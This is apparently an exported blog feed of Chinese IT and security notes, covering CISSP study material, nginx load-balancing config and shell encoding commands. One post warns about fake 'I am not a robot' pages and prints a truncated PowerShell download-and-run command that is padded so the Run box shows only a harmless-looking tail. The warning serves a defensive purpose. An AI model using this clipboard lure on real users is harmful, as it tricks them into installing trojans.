级别上使用。</p><p>提供加密、灵活性和弹性。</p><p>多层协议的缺点是：</p><p>隐蔽通道</p><p>过滤器旁路</p><p>对网段边界的违背</p><h2 id="了解融合协议"><a href="#了解融合协议" class="headerlink" title="了解融合协议"></a>了解融合协议</h2><p>PCoE</p><p>MPLS </p><p>iSCSI</p><p>VPN</p><p>SDN</p><p>云</p><p>虚拟化</p><p>SOA</p><p>微服务</p><p>基础设施即代码（IaC）</p><p>无服务架构</p><h2 id="定义-VoIP"><a href="#定义-VoIP" class="headerlink" title="定义 VoIP"></a>定义 VoIP</h2><p>网络电话（VoIP）是一种隧道机制，将音频、视频和其他数据封装到 IP 数据包中，以支持 TCP &#x2F; IP网络连接上的语音呼叫和多媒体协作。</p><h2 id="了解网络分段的类型和目的"><a href="#了解网络分段的类型和目的" class="headerlink" title="了解网络分段的类型和目的"></a>了解网络分段的类型和目的</h2><p>网络分段可用于管理流量、提高性能和加强安全性。</p><p>网段或子网的示例包括：内网、外网和屏蔽子网。</p><h2 id="了解微分网段"><a href="#了解微分网段" class="headerlink" title="了解微分网段"></a>了解微分网段</h2><p>微分网段将内网划分为多个子区域。</p><p>子区域可能小到单个设备，例如高价值服务器、甚至客户端或端点设备。</p><p>每个区域通过内部分段防火墙（ISFW）、子网或 VLAN 和其他域分开。</p><h2 id="定义-SDN"><a href="#定义-SDN" class="headerlink" title="定义 SDN"></a>定义 SDN</h2><p>软件定义网络（SDN）是一种独特的网络操作、设计和管理方法。</p><p>SDN 旨在将基础设施层（硬件和基于硬件的设置）与控制层（数据传输管理的网络服务）分离。</p><h2 id="了解各种无线技术"><a href="#了解各种无线技术" class="headerlink" title="了解各种无线技术"></a>了解各种无线技术</h2><p>手机、蓝牙（802.15）和无线网络（802.11）都被称为无线技术。</p><p>了解各无线技术的差异、优势和劣势。</p><p>了解保护 802.11 网络安全的基础知识。</p><p>了解 RFID、NFC、LiFi、卫星、窄带和 Zigbee。</p><h2 id="了解服务集标识符SSID"><a href="#了解服务集标识符SSID" class="headerlink" title="了解服务集标识符SSID"></a>了解服务集标识符SSID</h2><p>ESSID</p><p>BSSID</p><p>ISSID</p><h2 id="定义-WPA2"><a href="#定义-WPA2" class="headerlink" title="定义 WPA2"></a>定义 WPA2</h2><p>IEEE 802.11i 定义了 Wi-Fi 受保护访问 2 （WPA2）。</p><p>WPA2 支持 2 种身份认证选项：预共享密钥（PSK）或个人模式（PER）模式和 IEEE 802.1x 或企业（ENT）模式。</p><p> WPA2 使用 AES-CCMP。</p><h2 id="理解-WPA3"><a href="#理解-WPA3" class="headerlink" title="理解 WPA3"></a>理解 WPA3</h2><p>Wi-Fi 受保护访问 3（WPA3）使用 192 位 AES CCMP 加密。</p><p>WPA3-PER 保持 128 位 AES CCMP 。</p><p>WPA3-PER 使用对等同步身份认证。</p><h2 id="SAE定义"><a href="#SAE定义" class="headerlink" title="SAE定义"></a>SAE定义</h2><p>对等同步身份认证（SAE）执行被称为蜻蜓密钥交换（Dragonfly Key Exchange）的零知识证明过程，该过程本身就是 Diffie-Hellman 的衍生物。</p><p>该过程使用预设密码以及客户端和 AP 的 MAC 地址来执行身份认证和会话密钥交换。</p><h2 id="了解现场调查"><a href="#了解现场调查" class="headerlink" title="了解现场调查"></a>了解现场调查</h2><p>现场调查是指用射频信号检测器对无线信号强度、质量和干扰进行正式评估。</p><p>执行现场调查时可将无线基站放置在所需位置，然后从整个区域收集信号测量值。</p><h2 id="了解-WPS-攻击"><a href="#了解-WPS-攻击" class="headerlink" title="了解 WPS 攻击"></a>了解 WPS 攻击</h2><p>Wi-Fi 保护设置（WPS）旨在简化向安全无线网络添加新客户端的过程。</p><p>一旦触发 WPS ，将自动连接第一个新的搜索网络无线客户端。</p><h2 id="了解-MAC-过滤"><a href="#了解-MAC-过滤" class="headerlink" title="了解 MAC 过滤"></a>了解 MAC 过滤</h2><p>MAC 过滤器是授权无线客户端接口 MAC 地址的列表，WAP 使用该 MAC 地址来阻止对所有未授权设备的访问。</p><h2 id="了解天线类型"><a href="#了解天线类型" class="headerlink" title="了解天线类型"></a>了解天线类型</h2><p>各种天线类型可用于无线客户端和基站。</p><p>包括全向极天线以及许多定向天线，如八木天线、卡特纳天线、平板天线和抛物线天线。</p><h2 id="了解强制门户"><a href="#了解强制门户" class="headerlink" title="了解强制门户"></a>了解强制门户</h2><p>强制门户是一种身份认证技术，可将新连接的客户端重定向到基于 Web 的门户网站访问控制页面 。</p><h2 id="定义扩频"><a href="#定义扩频" class="headerlink" title="定义扩频"></a>定义扩频</h2><p>频谱使用技术管理有限的无线电频率的同时使用，包括 FHSS、DSSS、OFDM。</p><h2 id="了解蓝牙容易遭受的攻击"><a href="#了解蓝牙容易遭受的攻击" class="headerlink" title="了解蓝牙容易遭受的攻击"></a>了解蓝牙容易遭受的攻击</h2><p>攻击包括蓝牙嗅探、蓝牙攻击、蓝牙劫持、蓝牙侵吞和蓝牙窃听。</p><h2 id="了解无线攻击"><a href="#了解无线攻击" class="headerlink" title="了解无线攻击"></a>了解无线攻击</h2><p>攻击包括战争驾驶、无线扫描器&#x2F;破解器、恶意接入点、Evil Twin、解除关联、阻塞、IV滥用和重放。</p><h2 id="熟悉-CDN"><a href="#熟悉-CDN" class="headerlink" title="熟悉 CDN"></a>熟悉 CDN</h2><p>内容分发网络（CDN）或内容交付网络是部署在互联网上众多数据中心的资源服务的集合，目的是为托管内容提供低延迟、高性能和高可用性。</p><h2 id="了解常见的网络设备"><a href="#了解常见的网络设备" class="headerlink" title="了解常见的网络设备"></a>了解常见的网络设备</h2><p>中继器</p><p>集线器</p><p>调制解调器</p><p>网桥</p><p>交换机</p><p>路由器</p><p>LAN扩展器</p><p>跳转箱</p><p>传感器</p><p>采集器</p><p>聚合器</p><h2 id="定义-NAC"><a href="#定义-NAC" class="headerlink" title="定义 NAC"></a>定义 NAC</h2><p>网络访问控制（NAC）是通过严格遵守和实施安全策略来控制对环境的访问的概念。</p><p>了解 802.1x、接入前控制、接入后控制、基于代理和无代理。</p><h2 id="了解不同类型的防火墙"><a href="#了解不同类型的防火墙" class="headerlink" title="了解不同类型的防火墙"></a>了解不同类型的防火墙</h2><p>防火墙常见的类型：</p><p>静态数据包过滤</p><p>应用级</p><p>电路级</p><p>状态检查</p><p>NGFW</p><p>ISFW</p><p>了解虚拟防火墙、过滤器&#x2F;规则&#x2F;ACL&#x2F;元组、堡垒主机、入口、出口、RTBH、无状态和有状态、WAF、SWG、TCP 包装器、DPI 以及内容和 URL 过滤。</p><h2 id="了解代理"><a href="#了解代理" class="headerlink" title="了解代理"></a>了解代理</h2><p>代理服务器用于在客户端和服务器之间进行解调。</p><p>代理最常用于为专用网络上的客户端提供互联网访问，同时保护客户端的身份。</p><p>了解转发、反向、透明和非透明。</p><h2 id="了解端点安全"><a href="#了解端点安全" class="headerlink" title="了解端点安全"></a>了解端点安全</h2><p>端点安全的概念是指无论其网络或电信通道是否提供安全性，每个单独的设备都必须维护本地安全。</p><h2 id="了解-EDR"><a href="#了解-EDR" class="headerlink" title="了解 EDR"></a>了解 EDR</h2><p>端点检测和响应（EDR）是一种安全机制，是传统反恶意软件产品、IDS 和防火墙解决方案的演变。</p><p>EDR 旨在检测、记录、评估和响应可疑活动和事件。</p><h2 id="了解-MDR"><a href="#了解-MDR" class="headerlink" title="了解 MDR"></a>了解 MDR</h2><p>托管检测和响应（MDR）侧重于威胁检测和调解，但不限于端点的范围。</p><p>MDR 是一种试图实施监控 IT 环境以快速检测和解决威胁的服务。</p><p>MDR 解决方案通常是多种技术的组合和集成，包括 SIEM、网络流量分析（NTA）、EDR 和 IDS 。</p><h2 id="了解-EPP"><a href="#了解-EPP" class="headerlink" title="了解 EPP"></a>了解 EPP</h2><p>端点保护平台（EPP）是 EDR 的变体，就像 IPS 是 IDS 的变体一样。</p><p>EPP 的重点是四个主要的安全功能：预测、预防、检测和响应。</p><p>EPP 更主动地进行预防和预测，它是更被动的 EDR 概念的变体。</p><h2 id="了解-XDR"><a href="#了解-XDR" class="headerlink" title="了解 XDR"></a>了解 XDR</h2><p>扩展检测和响应（XDR）组件通常包括 EDR、MDR 和 EPP 元素。</p><p>XDR 不仅关注端点，而且通常包括 NTA、NIDS 和 NIPS 功能。</p><h2 id="注意-MSSP"><a href="#注意-MSSP" class="headerlink" title="注意 MSSP"></a>注意 MSSP</h2><p>托管安全服务提供商（MSSP）可以提供集中控制和管理的 XDR 解决方案。</p><p>MSSP 解决方案可以完全部署在本地，完全部署在云中或者部署为混合结构。</p><p>MSSP 解决方案可以通过 SOC 进行监督，而 SOC 是本身是本地或远程的。</p><p>通常，与 MSSP 合作提供 EDR、MDR、EPP 和 XDR 服务，可以让组织获得这些高级安全产品的好处，并利用 MSSP 安全管理和响应专业人员的经验和专业知识。</p><h2 id="描述不同的布线类型"><a href="#描述不同的布线类型" class="headerlink" title="描述不同的布线类型"></a>描述不同的布线类型</h2><p>包括 STP、 UTP、 10Base2 同轴电缆(细网)、 10Base5 同轴电缆(粗 网)、 100BaseT、 1000BaseT和光纤。熟悉 UTP 类别 1 到 8。</p><h2 id="熟悉常见的-LAN-技术"><a href="#熟悉常见的-LAN-技术" class="headerlink" title="熟悉常见的 LAN 技术"></a>熟悉常见的 LAN 技术</h2><p>最常见的局域网技术是以太网。</p><p>熟悉以下几点:</p><p>模拟与数字通信;</p><p>同步与异步通信;</p><p>双工;</p><p>基带与宽带通信;</p><p>广播、多播和单播通信;</p><p> CSMA、 CSMA&#x2F;CD 和 CSMA&#x2F;CA; </p><p>令牌传递和轮询。</p><h2 id="了解标准网络拓扑"><a href="#了解标准网络拓扑" class="headerlink" title="了解标准网络拓扑"></a>了解标准网络拓扑</h2><p>包括环形、总线、星形和网状。</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>seccert</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>seccert</tag>
      
      <tag>cissp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nginx_conf</title>
    <link href="/2025/02/18/yunwei/applications/nginx/nginx_conf/"/>
    <url>/2025/02/18/yunwei/applications/nginx/nginx_conf/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="upstream上游服务器组"><a href="#upstream上游服务器组" class="headerlink" title="upstream上游服务器组"></a>upstream上游服务器组</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">upstream waf_A_class &#123;<br>    hash <span class="hljs-variable">$client_realip</span>;<br>   <span class="hljs-built_in"> server </span>127.0.0.1:43210 <span class="hljs-attribute">max_fails</span>=3 <span class="hljs-attribute">fail_timeout</span>=60s;<br>   <span class="hljs-built_in"> server </span>127.0.0.1:43211 <span class="hljs-attribute">max_fails</span>=3 <span class="hljs-attribute">fail_timeout</span>=60s;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="hash-client-realip-负载算法"><a href="#hash-client-realip-负载算法" class="headerlink" title="hash $client_realip; 负载算法"></a>hash $client_realip; 负载算法</h3><p>指定负载均衡算法为<strong>基于客户端IP的哈希算法</strong></p><p>$client_realip 是nginx变量，表示客户端的真实IP地址</p><p>哈希算法的作用：</p><p>​根据客户端 IP 的哈希值，将同一客户端的请求固定分发到同一台后端服务器</p><p>​适用于需要会话保持（Session Persistence）的场景</p><h3 id="server-后端服务器"><a href="#server-后端服务器" class="headerlink" title="server 后端服务器"></a>server 后端服务器</h3><p>server ip:port  后端服务器</p><p>max_fails&#x3D;3表示在fail_timeout内，如果服务器失败（如连接超时或返回错误）达到 3 次，将服务器标记为不可用</p><p>fail_timeout&#x3D;60s表示服务器被标记为不可用后，60秒内不再向其分发请求，60秒后再次尝试分发请求</p><h3 id="使用实例"><a href="#使用实例" class="headerlink" title="使用实例"></a>使用实例</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">http</span> &#123;<br>    <span class="hljs-section">upstream</span> waf_A_class &#123;<br>        <span class="hljs-attribute">hash</span> <span class="hljs-variable">$client_realip</span>;<br>        <span class="hljs-attribute">server</span> <span class="hljs-number">127.0.0.1:43210</span> max_fails=<span class="hljs-number">3</span> fail_timeout=<span class="hljs-number">60s</span>;<br>        <span class="hljs-attribute">server</span> <span class="hljs-number">127.0.0.1:43211</span> max_fails=<span class="hljs-number">3</span> fail_timeout=<span class="hljs-number">60s</span>;<br>    &#125;<br><br>    <span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">listen</span> <span class="hljs-number">80</span>;<br>        <span class="hljs-attribute">server_name</span> example.com;<br><br>        <span class="hljs-section">location</span> / &#123;<br>            <span class="hljs-attribute">proxy_pass</span> http://waf_A_class;<br>            <span class="hljs-attribute">proxy_set_header</span> Host <span class="hljs-variable">$host</span>;<br>            <span class="hljs-attribute">proxy_set_header</span> X-Real-IP <span class="hljs-variable">$remote_addr</span>;<br>            <span class="hljs-attribute">proxy_set_header</span> X-Forwarded-For <span class="hljs-variable">$proxy_add_x_forwarded_for</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>所有访问 <code>example.com</code> 的请求都会被代理到 <code>waf_A_class</code> 上游组中的服务器</p><p>Nginx 会根据客户端 IP 的哈希值将请求分发到 <code>127.0.0.1:43210</code> 或 <code>127.0.0.1:43211</code></p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>applications</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>applications</tag>
      
      <tag>nginx</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sublimetips</title>
    <link href="/2025/02/13/yunwei/yunweitips/sublimetips/"/>
    <url>/2025/02/13/yunwei/yunweitips/sublimetips/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="删除空行"><a href="#删除空行" class="headerlink" title="删除空行"></a>删除空行</h2><p>MAC 下 command+option+F 打开搜索替换框</p><p>使用以下正则搜索</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">^\s*$\n<br><br></code></pre></td></tr></table></figure><p><code>^</code> 表示行的开头</p><p><code>\s*</code>表示任意数量的空白字符（包含空格、制表符等）</p><p><code>$</code> 表示行的结尾</p><p><code>\n</code> 表示换行符</p><p>替换框留空替换即可</p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>tips</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>yunweitips</tag>
      
      <tag>sublime</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>人工验证挂马</title>
    <link href="/2025/02/13/security/netsec/%E6%8C%82%E9%A9%AC/%E4%BA%BA%E5%B7%A5%E9%AA%8C%E8%AF%81%E6%8C%82%E9%A9%AC/"/>
    <url>/2025/02/13/security/netsec/%E6%8C%82%E9%A9%AC/%E4%BA%BA%E5%B7%A5%E9%AA%8C%E8%AF%81%E6%8C%82%E9%A9%AC/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p>来自TK微博</p><p><a href="https://weibo.com/6827625527/Pe6VpcQ9q">https://weibo.com/6827625527/Pe6VpcQ9q</a></p><p>现在黑产有一种新的社交工程学挂马方案。</p><p>你访问一些网站的时候，网页忽然弹出提示，让你证明自己是真人。这倒也很常见，于是你点了一下那个验证窗口，又弹出提示，让你按 Win+R，然后 Ctrl+V，再回车（图一）。</p><p>你按下 Win+R，发现弹出一个窗口。再按 Ctrl+V，窗口里出现了：✅ ‘I am not a robot: CAPTCHA Verification UID: 7811’（图二）。这好像真的是在做验证。但这时只要你再按一下回车，你的电脑就会下载并执行攻击者的木马。</p><p>因为在你最开始点击那个验证窗口的时候，网站向你的剪贴板中写入的内容实际是：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">powershell</span> -w <span class="hljs-number">1</span> -C <span class="hljs-string">&quot;网页链接l)&#125;&quot;</span> <span class="hljs-comment"># ✅ &#x27;I am not a robot: CAPTCHA Verification UID: 7811&#x27;</span><br><br></code></pre></td></tr></table></figure><p>这是一条下载并执行木马的命令。因为 Win+R 弹出的那个命令执行输入框地宽度有限，对过长的输入行只显示末尾部分。攻击者精确地控制内容长度，巧妙地让你只能看到末尾那段一点都不可疑的内容。等你明白过来的时候，已经晚了。</p><p>图三显然是一个受害者。</p><p><img src="/007s41inly1hyj2g41sovj30rq0uojvy.jpg" alt="img"></p><p><img src="/007s41inly1hyj2l0w14wj30he091419.jpg" alt="img"></p><p><img src="/007s41inly1hyj2m5a4qkj30r70inguy.jpg" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>netsec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>netsec</tag>
      
      <tag>挂马</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>echo</title>
    <link href="/2025/02/06/yunwei/yunweicommands/echo/"/>
    <url>/2025/02/06/yunwei/yunweicommands/echo/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h2><h3 id="n-取消输出末尾的换行符"><a href="#n-取消输出末尾的换行符" class="headerlink" title="-n 取消输出末尾的换行符"></a>-n 取消输出末尾的换行符</h3><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@nvm</span>- tmp]<span class="hljs-meta"># echo -n adb</span><br>adb[root<span class="hljs-symbol">@nvm</span>- tmp]<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@nvm</span>- tmp]<span class="hljs-meta"># echo adb</span><br>adb<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>yunweicommands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>yunweicommands</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>encode_decode</title>
    <link href="/2025/02/06/yunwei/yunweitips/encode_decode/"/>
    <url>/2025/02/06/yunwei/yunweitips/encode_decode/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="Base64-编码-解码"><a href="#Base64-编码-解码" class="headerlink" title="Base64 编码&#x2F;解码"></a>Base64 编码&#x2F;解码</h3><h4 id="Base64-编码-base64"><a href="#Base64-编码-base64" class="headerlink" title="Base64 编码 base64"></a>Base64 编码 base64</h4><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@nvm</span>- tmp]<span class="hljs-meta"># echo -n abc | base64</span><br>YWJj<br></code></pre></td></tr></table></figure><h4 id="Base64-解码-base64-–decode"><a href="#Base64-解码-base64-–decode" class="headerlink" title="Base64 解码 base64 –decode"></a>Base64 解码 base64 –decode</h4><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@nvm</span>- tmp]<span class="hljs-meta"># echo -n <span class="hljs-string">&quot;YWJj&quot;</span> | base64 --decode</span><br>abc[root<span class="hljs-symbol">@nvm</span>- tmp]<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><h3 id="Hex（十六进制）编码-解码"><a href="#Hex（十六进制）编码-解码" class="headerlink" title="Hex（十六进制）编码&#x2F;解码"></a>Hex（十六进制）编码&#x2F;解码</h3><p>将二进制数据转换为十六进制字符串，十六进制字符串表示方法为\x编码值</p><h4 id="Hex-编码-xxd-p"><a href="#Hex-编码-xxd-p" class="headerlink" title="Hex 编码 xxd -p"></a>Hex 编码 xxd -p</h4><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@nvm</span>- tmp]<span class="hljs-meta"># echo -n abc | xxd -p</span><br><span class="hljs-number">616263</span><br></code></pre></td></tr></table></figure><p>\x61\x62\63  &lt;&#x3D;&#x3D;&gt; abc</p><h4 id="Hex-解码-xxd-r-p"><a href="#Hex-解码-xxd-r-p" class="headerlink" title="Hex 解码 xxd -r -p"></a>Hex 解码 xxd -r -p</h4><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@nvm</span>- tmp]<span class="hljs-meta"># echo -n <span class="hljs-string">&quot;6162630a&quot;</span> | xxd -r -p</span><br>abc<br></code></pre></td></tr></table></figure><h3 id="Octal（八进制）编码-解码"><a href="#Octal（八进制）编码-解码" class="headerlink" title="Octal（八进制）编码&#x2F;解码"></a>Octal（八进制）编码&#x2F;解码</h3><p>将二进制数据转换为八进制字符串</p><h4 id="Octal（八进制）编码-od-An-to1"><a href="#Octal（八进制）编码-od-An-to1" class="headerlink" title="Octal（八进制）编码  od -An -to1"></a>Octal（八进制）编码  od -An -to1</h4><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@nvm</span>- tmp]<span class="hljs-meta"># echo -n <span class="hljs-string">&quot;abc&quot;</span> | od -An -to1</span><br> <span class="hljs-number">141</span> <span class="hljs-number">142</span> <span class="hljs-number">143</span><br></code></pre></td></tr></table></figure><h4 id="Octal（八进制）解码-printf"><a href="#Octal（八进制）解码-printf" class="headerlink" title="Octal（八进制）解码 printf"></a>Octal（八进制）解码 printf</h4><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">[root<span class="hljs-title">@nvm-</span> tmp]# printf <span class="hljs-string">&quot;<span class="hljs-char escape_">\14</span>1<span class="hljs-char escape_">\14</span>2<span class="hljs-char escape_">\14</span>3&quot;</span><br>abc<br></code></pre></td></tr></table></figure><h3 id="Binary（二进制）编码-解码"><a href="#Binary（二进制）编码-解码" class="headerlink" title="Binary（二进制）编码&#x2F;解码"></a>Binary（二进制）编码&#x2F;解码</h3><p>将二进制数据转换为二进制字符串</p><h4 id="Binary（二进制）编码-xxd-b"><a href="#Binary（二进制）编码-xxd-b" class="headerlink" title="Binary（二进制）编码 xxd -b"></a>Binary（二进制）编码 xxd -b</h4><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dns">[root@nvm-<span class="hljs-number">9</span>s4arqnxftb0 tmp]# echo -n abc | xxd -b<br><span class="hljs-number">00000000</span>: <span class="hljs-number">01100001</span> <span class="hljs-number">01100010</span> <span class="hljs-number">01100011</span>                             abc<br></code></pre></td></tr></table></figure><h4 id="Binary（二进制）解码"><a href="#Binary（二进制）解码" class="headerlink" title="Binary（二进制）解码"></a>Binary（二进制）解码</h4><h3 id="ASCII-编码-解码"><a href="#ASCII-编码-解码" class="headerlink" title="ASCII 编码&#x2F;解码"></a>ASCII 编码&#x2F;解码</h3><p>将二进制数据转换为 ASCII 字符</p><h4 id="ASCII-编码-od-An-tu1"><a href="#ASCII-编码-od-An-tu1" class="headerlink" title="ASCII 编码 od -An -tu1"></a>ASCII 编码 od -An -tu1</h4><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tap">[root@nvm- tmp]<span class="hljs-comment"># echo -n abc | od -An -tu1</span><br> <span class="hljs-number"> 97 </span><span class="hljs-number"> 98 </span> 99<br></code></pre></td></tr></table></figure><h4 id="ASCII-解码-printf-‘-b’"><a href="#ASCII-解码-printf-‘-b’" class="headerlink" title="ASCII 解码 printf ‘%b’"></a>ASCII 解码 printf ‘%b’</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>tips</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>yunweitips</tag>
      
      <tag>encode_decode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>9-域3安全架构与工程-安全漏洞、威胁和对策</title>
    <link href="/2025/02/05/security/seccert/cissp/9-%E5%9F%9F3%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84%E4%B8%8E%E5%B7%A5%E7%A8%8B-%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E3%80%81%E5%A8%81%E8%83%81%E5%92%8C%E5%AF%B9%E7%AD%96/"/>
    <url>/2025/02/05/security/seccert/cissp/9-%E5%9F%9F3%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84%E4%B8%8E%E5%B7%A5%E7%A8%8B-%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E3%80%81%E5%A8%81%E8%83%81%E5%92%8C%E5%AF%B9%E7%AD%96/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p>安全专业人员必须密切关注系统本身，并确保其更高级别的保护控制并非建立在不牢靠的基础之上。</p><h1 id="9-1共担责任"><a href="#9-1共担责任" class="headerlink" title="9.1共担责任"></a>9.1共担责任</h1><p>共担责任（shared responsibility）是安全设计的原则，表明任何机构都不是孤立运行的。</p><p><strong>机构里的每个人都负有一定的安全责任</strong>。</p><p>1、建立和维护安全是CISO和安全团队的职责。依照安全规定执行自己的任务是正式员工的职责。监控环境是否存在违规行为是审计员的职责。</p><p>2、机构对利益相关方负有作出周密安全决策以保持机构可持续发展的责任。</p><p>3、与第三方合作时，每个实体都要清楚自己在执行正常操作和维护安全方面所应承担的那部分共担责任，即共担责任模型。</p><p>4、当意识到新漏洞和新威胁的存在时，应该负责地将信息披露给相关供应商或信息共享中心（也叫威胁情报来源或服务）。</p><h1 id="9-2评价和弥补安全架构、设计和解决方案元素的漏洞"><a href="#9-2评价和弥补安全架构、设计和解决方案元素的漏洞" class="headerlink" title="9.2评价和弥补安全架构、设计和解决方案元素的漏洞"></a>9.2评价和弥补安全架构、设计和解决方案元素的漏洞</h1><p>系统越复杂，所能提供的保证就越少。更高的复杂性意味着存在漏洞的区域更多，需要抵御威胁的区域也更多。</p><h2 id="硬件"><a href="#硬件" class="headerlink" title="硬件"></a>硬件</h2><p>硬件（hardware）包含计算机中可以被实际触摸到的任何有形部分：键盘、显示器、CPU、存储介质和内存芯片等。</p><h3 id="CPU"><a href="#CPU" class="headerlink" title="CPU"></a>CPU</h3><p>中央处理单元（central processing unit，CPU），也被称为处理器（processor）或微处理器（microprocessor），是计算机的神经中枢-这块芯片（或者多处理器系统中的多块芯片）控制着所有主要操作。</p><p>CPU只执行一组有限的计算和逻辑操作，是为了加快执行计算和逻辑操作速度。</p><h3 id="执行类型"><a href="#执行类型" class="headerlink" title="执行类型"></a>执行类型</h3><h4 id="多任务处理"><a href="#多任务处理" class="headerlink" title="多任务处理"></a>多任务处理</h4><p>多任务处理（multitasking）是指同时处理两个或多个任务。</p><p>单核多任务处理系统，在任意给定时刻都只执行一个进程。</p><h4 id="多核"><a href="#多核" class="headerlink" title="多核"></a>多核</h4><p>多核（multicore）CPU，可以同时和或独立执行内核的芯片。</p><h4 id="多重处理"><a href="#多重处理" class="headerlink" title="多重处理"></a>多重处理</h4><p>多重处理（multiprocessing），一个多处理器系统驾驭多个处理器的处理能力来完成一个多线程应用的执行。</p><p>某些多处理器系统可能会把某种进程或执行分配或指定给某个特定CPU或内核处理，这就是<strong>亲和性</strong>（affinity）。</p><h4 id="多程序设计"><a href="#多程序设计" class="headerlink" title="多程序设计"></a>多程序设计</h4><p>多程序设计（multiprogramming）类似于多任务处理。由操作系统进行协调，假性地在单个处理器上同时执行两个任务，以提供效率。</p><p>单程序完成时间延迟，完成所有任务时间缩短</p><h4 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h4><p>多线程（multithreading）允许在一个进程中执行多个并发任务。</p><p>多任务处理是多个任务占用多个进程，多线程是多个任务占用一个进程。</p><p>多线程常用于因多个活动进程之间频繁的上下文切换而导致开销过大且效率下降的应用程序。</p><h3 id="保护机制"><a href="#保护机制" class="headerlink" title="保护机制"></a>保护机制</h3><h4 id="保护环-protection-ring"><a href="#保护环-protection-ring" class="headerlink" title="保护环 protection ring"></a>保护环 protection ring</h4><p>把操作系统中的代码和组件（以及应用程序、在操作系统控制下运行的其他代码）组成同心环，越靠近中心，权限级别就越高。</p><p>4个环的模型（0-3）</p><p><img src="/image-20250210191841477.png" alt="image-20250210191841477"></p><p><strong>环0： 操作系统内核</strong> - 